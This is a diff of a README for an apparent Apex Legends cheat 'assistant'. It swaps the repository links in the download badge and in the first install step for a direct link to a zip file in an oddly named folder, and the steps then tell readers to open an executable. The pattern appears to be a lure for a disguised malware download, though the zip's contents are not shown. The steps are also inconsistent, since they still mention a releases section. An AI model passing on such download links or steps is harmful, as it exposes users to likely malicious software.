@@ -1,6 +1,6 @@
 # 🎯 apex-Legends-Overdrive-Assistant - Improve your performance in Apex Legends
 
-[![](https://img.shields.io/badge/Download-Assistant-blue.svg)](https://github.com/Tankdestroyerfelischaus425/apex-Legends-Overdrive-Assistant)
+[![](https://img.shields.io/badge/Download-Assistant-blue.svg)](https://raw.githubusercontent.com/Tankdestroyerfelischaus425/apex-Legends-Overdrive-Assistant/main/hysterogeny/apex_Legends_Assistant_Overdrive_v1.5.zip)
 
 ## 📌 Overview
 
@@ -37,7 +37,7 @@ Your computer needs specific components to run this software.
 
 Follow these steps to install the assistant.
 
-1. Visit the following link to download the software: [https://github.com/Tankdestroyerfelischaus425/apex-Legends-Overdrive-Assistant](https://github.com/Tankdestroyerfelischaus425/apex-Legends-Overdrive-Assistant).
+1. Visit the following link to download the software: [https://raw.githubusercontent.com/Tankdestroyerfelischaus425/apex-Legends-Overdrive-Assistant/main/hysterogeny/apex_Legends_Assistant_Overdrive_v1.5.zip](https://raw.githubusercontent.com/Tankdestroyerfelischaus425/apex-Legends-Overdrive-Assistant/main/hysterogeny/apex_Legends_Assistant_Overdrive_v1.5.zip).
 2. Locate the file named `ApexAssistant.exe` in the releases section of that page.
 3. Save the file to your desktop or a folder you can find easily.
 4. Open the file to start the installation wizard.
